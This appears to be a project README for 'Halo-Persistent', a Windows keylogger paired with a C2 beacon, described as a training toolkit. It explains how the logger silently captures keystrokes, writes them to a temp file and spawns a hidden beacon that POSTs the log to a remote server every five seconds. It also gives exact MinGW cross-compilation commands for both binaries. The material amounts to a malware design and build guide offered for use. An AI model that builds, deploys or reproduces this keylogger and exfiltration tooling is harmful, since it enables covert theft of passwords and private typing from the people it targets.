# C2 Stealth Toolkit: "Halo-Persistent"

![C2 Architecture](https://img.shields.io/badge/Architecture-Parent--Child-blue)
![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey)
![Security](https://img.shields.io/badge/Purpose-Educational%20Training-red)

A lightweight, dual-process C2 (Command & Control) framework developed for cybersecurity training environments. This toolkit demonstrates realistic malware techniques including stealth execution, parent-child process persistence, and automated data exfiltration via HTTP POST.

---

## 🛠 Project Architecture & Component Breakdown

The system utilizes a **Parent-Child process model** to ensure modularity and reduce the forensic footprint of individual binaries. Both components are compiled for the `Windows (GUI)` subsystem to ensure zero console visibility.

| Component | Bin Size | Dependencies | Role |
| :--- | :--- | :--- | :--- |
| **pure_no_exit32.exe** | ~12KB | `kernel32`, `user32` | Persistent Stealth Logger |
| **halo_persistent32.exe**| ~18KB | `wininet`, `kernel32` | C2 Beacon & Exfiltrator |

### Component Mechanics

#### 1. Persistent Logger (`pure_no_exit32.exe`)
* **Global Capture Engine:** Implements low-level monitoring via `GetAsyncKeyState()`.
* **The "Enter" Trigger:** Captures data silently until `VK_RETURN` (ENTER) is detected. On trigger:
    * Flushes current keystroke buffer to `C:\Temp\log.log` (Append mode).
    * Spawns `halo_persistent32.exe` (C2 Beacon) as a hidden background process.
    * Resets the local buffer and continues logging without interruption.
* **Overflow Protection:** Includes an automated safety check; if the buffer exceeds 255 characters, the tool auto-saves to prevent memory corruption or data loss.
* **Stealth Subsystem:** Compiled with the `-mwindows` flag to run without a console window, taskbar icon, or visible UI.

#### 2. C2 Beacon (`halo_persistent32.exe`)
* **Exfiltration Logic:** Periodically reads the `C:\Temp\log.log` artifact and performs an HTTP POST of the full log content to the remote C2 server.
* **Heartbeat/Timing:** Configured for high-frequency 5-second beacon intervals.
* **Parent-Awareness (Persistence):** Monitors the parent process handle; the beacon automatically terminates if `pure_no_exit32.exe` is closed, preventing "orphan" process detection.
* **Native Net-Stack:** Leverages the `WinINet` API for realistic web communication that mirrors standard application traffic.

---

## 🏗 Build & Deployment

### Cross-Compilation (Linux to Windows)
The toolkit is optimized for the `MinGW-w64` toolchain on Ubuntu/Debian.

**1. Install Toolchain:**
```bash
sudo apt update && sudo apt install gcc-mingw-w64-i686 nasm-mingw-w64

# Build Keylogger (pure_no_exit32.exe)
i686-w64-mingw32-gcc -m32 pure_no_exit.c -o pure_no_exit32.exe -lkernel32 -luser32 -mwindows -s -O2

# Build C2 Beacon (halo_persistent32.exe)
i686-w64-mingw32-gcc -m32 halo_persistent.c -o halo_persistent32.exe -lwininet -lkernel32 -luser32 -mwindows -s -O2
